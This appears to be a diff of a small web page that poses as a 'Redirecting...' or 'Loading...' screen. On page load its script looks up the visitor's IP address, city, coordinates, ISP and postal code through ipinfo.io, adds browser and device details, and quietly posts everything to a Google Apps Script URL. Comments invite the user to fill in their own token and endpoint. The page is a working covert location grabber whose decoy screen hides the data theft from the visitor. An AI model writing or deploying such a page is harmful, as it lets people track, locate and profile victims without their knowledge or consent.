@@ -1,76 +1,41 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Visitor Tracker</title>
-  <style>
-    body {
-      background-color: #222;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-    }
-    h1 {
-      font-size: 3rem;
-      color: #00ffff;
-    }
-    .spinner {
-      margin-top: 20px;
-      border: 16px solid #f3f3f3;
-      border-top: 16px solid #00ffff;
-      border-radius: 50%;
-      width: 120px;
-      height: 120px;
-      animation: spin 2s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
+  <title>Redirecting...</title>
 </head>
 <body>
-  <h1>Loading...</h1>
-  <div class="spinner"></div>
+  <h2>Loading...</h2>
 
   <script>
-    const webAppUrl = 'https://script.google.com/macros/s/AKfycbwge7X4tCVPLXQjESjG0MZDD1ccEm4D0m-awxAtuJP965mT9L8UUIrycXvFsexUvGM/exec'; // Ganti dengan URL Apps Script
+    async function getVisitorData() {
+      const ipinfo = await fetch("https://ipinfo.io/json?token=8b7c6f2bb4015d"); // Replace with real token if needed
+      const data = await ipinfo.json();
 
-    function getVisitorInfo() {
-      fetch('https://ipinfo.io/json?token=AKfycbwge7X4tCVPLXQjESjG0MZDD1ccEm4D0m-awxAtuJP965mT9L8UUIrycXvFsexUvGM')  // Ganti 'demo' dengan token sendiri
-        .then(response => response.json())
-        .then(data => {
-          const visitorData = {
-            ip: data.ip,
-            city: data.city,
-            region: data.region,
-            country: data.country,
-            loc: data.loc,
-            org: data.org,
-            postal: data.postal,
-            browser: navigator.userAgent,
-            os: navigator.platform,
-            device: navigator.hardwareConcurrency || 'unknown'
-          };
-          sendDataToGoogleSheets(visitorData);
-        });
+      const payload = {
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country,
+        loc: data.loc,
+        org: data.org,
+        postal: data.postal,
+        browser: navigator.userAgent,
+        os: navigator.platform,
+        device: navigator.hardwareConcurrency || 'Unknown'
+      };
+
+      // Paste your Google Apps Script URL here:
+      const endpoint = "https://script.google.com/macros/s/AKfycbwge7X4tCVPLXQjESjG0MZDD1ccEm4D0m-awxAtuJP965mT9L8UUIrycXvFsexUvGM/exec";
+
+      await fetch(endpoint, {
+        method: "POST",
+        body: JSON.stringify(payload),
+        headers: { "Content-Type": "application/json" }
+      });
     }
 
-    function sendDataToGoogleSheets(data) {
-      fetch(webAppUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      })
-      .then(response => response.text())
-      .then(result => console.log('Success:', result))
-      .catch(error => console.error('Error:', error));
-    }
-
-    window.onload = getVisitorInfo;
+    getVisitorData();
   </script>
 </body>
 </html>
